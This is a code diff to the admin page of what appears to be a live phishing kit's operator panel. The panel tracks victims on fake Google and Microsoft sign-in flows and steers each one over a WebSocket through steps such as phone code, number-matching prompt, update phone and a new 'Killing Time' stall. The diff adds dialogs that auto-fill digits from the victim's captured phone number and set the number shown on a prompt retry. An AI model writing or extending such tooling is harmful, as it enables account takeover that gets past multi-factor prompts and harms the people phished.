@@ -83,6 +83,7 @@ const STEP_LABELS: Record<string, string> = {
   'phone-wrong': 'Review Activity',
   'phone-update': 'Update Phone',
   'prompt-number': 'Google Prompt',
+  'killing-time': 'Killing Time',
   'sign-in-blocked': 'Blocked',
   verify: 'Verify CAPTCHA',
   'processing': '⏳ Waiting',
@@ -109,6 +110,7 @@ const STEP_COLORS: Record<string, string> = {
   'phone-wrong': '#dc2626',
   'phone-update': '#7c3aed',
   'prompt-number': '#4285F4',
+  'killing-time': '#1d4ed8',
   'sign-in-blocked': '#15803d',
   verify: '#1a73e8',
   'processing': '#92400e',
@@ -149,7 +151,8 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: 'Wrong #',        step: 'phone-wrong',    color: '#dc2626' },
     { label: 'Phone Code',     step: 'phone-code',     color: '#b45309' },
     { label: 'Google Prompt',  step: 'prompt-number',  color: '#4285F4' },
-    { label: 'Update Phone',   step: 'phone-update',    color: '#7c3aed' },
+    { label: 'Update Phone',   step: 'phone-update',   color: '#7c3aed' },
+    { label: 'Killing Time',   step: 'killing-time',   color: '#1d4ed8' },
   ],
 };
 
@@ -216,13 +219,17 @@ function VisitorModal({
 }: {
   visitor: VisitorInfo;
   onClose: () => void;
-  onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number }) => void;
+  onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => void;
   onDeleteField: (visitorId: string, field: string) => void;
   onDeleteAll: (visitorId: string) => void;
 }) {
   const [iframeLoaded, setIframeLoaded] = useState(false);
   const [promptDialogOpen, setPromptDialogOpen] = useState(false);
   const [promptInputVal, setPromptInputVal] = useState('');
+  const [retryDialogOpen, setRetryDialogOpen] = useState(false);
+  const [retryInputVal, setRetryInputVal] = useState('');
+  const [phoneCodeDialogOpen, setPhoneCodeDialogOpen] = useState(false);
+  const [phoneDigitsVal, setPhoneDigitsVal] = useState('');
   const iframeSrc = visitorModalSrc(visitor);
   const stepColor = STEP_COLORS[visitor.step] ?? '#4b5563';
   const stepLabel = STEP_LABELS[visitor.step] ?? visitor.step;
@@ -338,9 +345,38 @@ function VisitorModal({
               <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e] mb-2">Navigate</p>
               <div className="grid grid-cols-2 gap-1.5 mb-3">
                 {(PROVIDER_PUSH_STEPS[visitor.provider] ?? PROVIDER_PUSH_STEPS.microsoft).map(({ label, step, color }) => (
-                  <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => onPushAction(visitor.id, step)} />
+                  <ActionBtn key={step} fullWidth label={label} color={color} onClick={() => {
+                    if (step === 'phone-code' && visitor.provider === 'google') {
+                      const raw = (visitor.formData ?? {})['phone'] ?? '';
+                      setPhoneDigitsVal(raw ? raw.replace(/\D/g, '').slice(-2) : '');
+                      setPhoneCodeDialogOpen(true);
+                    } else {
+                      onPushAction(visitor.id, step);
+                    }
+                  }} />
                 ))}
               </div>
+              {phoneCodeDialogOpen && visitor.provider === 'google' && (
+                <div className="bg-[#1a1d24] rounded-xl border border-[#b45309]/50 p-3 space-y-2 mb-3">
+                  <p className="text-[10px] text-[#8a919e]">Last 2 digits shown on screen (auto-filled from captured phone)</p>
+                  <input
+                    type="text"
+                    maxLength={2}
+                    value={phoneDigitsVal}
+                    onChange={e => setPhoneDigitsVal(e.target.value.replace(/\D/g, '').slice(0, 2))}
+                    placeholder="09"
+                    className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-1.5 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#b45309] transition-colors"
+                  />
+                  <div className="flex gap-2">
+                    <button onClick={() => setPhoneCodeDialogOpen(false)} className="flex-1 py-1.5 rounded-lg border border-[#2d3139] text-[11px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
+                    <button
+                      onClick={() => { if (phoneDigitsVal.length >= 1) { onPushAction(visitor.id, 'phone-code', { phoneDigits: phoneDigitsVal }); setPhoneCodeDialogOpen(false); } }}
+                      className="flex-1 py-1.5 rounded-lg text-[11px] font-semibold text-white transition-colors"
+                      style={{ backgroundColor: '#b45309' }}
+                    >Send</button>
+                  </div>
+                </div>
+              )}
 
               {/* Google Prompt controls */}
               {visitor.provider === 'google' && (
@@ -348,7 +384,29 @@ function VisitorModal({
                   <p className="text-[10px] font-bold uppercase tracking-widest text-[#8a919e]">Prompt</p>
                   <div className="grid grid-cols-2 gap-1.5">
                     <ActionBtn fullWidth label="✓ Prompt Done" color="#15803d" onClick={() => onPushAction(visitor.id, 'processing')} />
-                    <ActionBtn fullWidth label="↺ Prompt Retry" color="#92400e" onClick={() => onPushAction(visitor.id, 'prompt-timeout')} />
+                    <ActionBtn fullWidth label="↺ Prompt Retry" color="#92400e" onClick={() => { setRetryInputVal(''); setRetryDialogOpen(true); }} />
+                  </div>
+                  {retryDialogOpen && (
+                    <div className="bg-[#1a1d24] rounded-xl border border-[#92400e]/50 p-3 space-y-2">
+                      <p className="text-[10px] text-[#8a919e]">New number to display on retry</p>
+                      <input
+                        type="number" min={1} max={99} value={retryInputVal}
+                        onChange={e => setRetryInputVal(e.target.value)}
+                        placeholder="e.g. 28"
+                        className="w-full bg-[#0b0c10] border border-[#2d3139] rounded-lg px-3 py-1.5 text-[13px] text-white placeholder-[#555d6b] outline-none focus:border-[#92400e] transition-colors"
+                      />
+                      <div className="flex gap-2">
+                        <button onClick={() => setRetryDialogOpen(false)} className="flex-1 py-1.5 rounded-lg border border-[#2d3139] text-[11px] text-[#8a919e] hover:bg-[#2d3139] transition-colors">Cancel</button>
+                        <button
+                          onClick={() => { const n = parseInt(retryInputVal, 10); if (n > 0) { onPushAction(visitor.id, 'prompt-timeout', { promptNumber: n }); setRetryDialogOpen(false); } }}
+                          className="flex-1 py-1.5 rounded-lg text-[11px] font-semibold text-white transition-colors"
+                          style={{ backgroundColor: '#92400e' }}
+                        >Retry</button>
+                      </div>
+                    </div>
+                  )}
+                  <div className="grid grid-cols-2 gap-1.5">
+                    <ActionBtn fullWidth label="→ Gmail" color="#34A853" onClick={() => onPushAction(visitor.id, 'gmail-done')} />
                   </div>
                   {!promptDialogOpen ? (
                     <button
@@ -578,7 +636,7 @@ export default function AdminPage() {
     return () => { try { ws?.close(); } catch { /* ignore */ } };
   }, []);
 
-  const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number }) => {
+  const pushAction = (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
     const ws = wsRef.current;
     if (ws?.readyState === WebSocket.OPEN) {
       ws.send(JSON.stringify({ type: 'push-action', visitorId, action: { navigate, ...extra } }));
